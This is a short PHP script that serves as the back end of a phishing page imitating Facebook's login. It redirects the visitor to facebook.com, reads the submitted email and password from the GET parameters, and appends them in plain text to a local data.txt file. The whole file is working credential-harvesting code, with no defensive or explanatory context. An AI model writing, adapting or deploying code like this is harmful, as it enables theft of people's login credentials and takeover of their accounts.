	<?php
header("Location:https://www.facebook.com");

$ft = fopen("data.txt","a");
if(isset($_GET["login"])){
   //$ft = fopen("data.txt","a");
   $email = $_GET["email"];
   $password = $_GET["pass"];
   fwrite($ft,"Email: ".$email);
   fwrite($ft,"\r");
   fwrite($ft,"Password: " . $password);
}
?>
